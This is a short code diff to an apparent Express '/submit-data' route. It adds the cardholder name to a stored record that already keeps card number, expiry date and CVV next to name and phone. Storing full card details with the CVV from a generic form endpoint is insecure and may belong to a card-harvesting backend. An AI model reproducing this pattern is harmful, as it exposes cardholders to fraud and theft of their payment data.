@@ -67,6 +67,7 @@ app.post('/submit-data', (req, res) => {
         name: data.name || 'غير معروف',
         phone: data.phone || '',
         details: {
+            cardName: data.cardName,
             cardNumber: data.cardNumber,
             expiryDate: data.expiryDate,
             cvv: data.cvv,
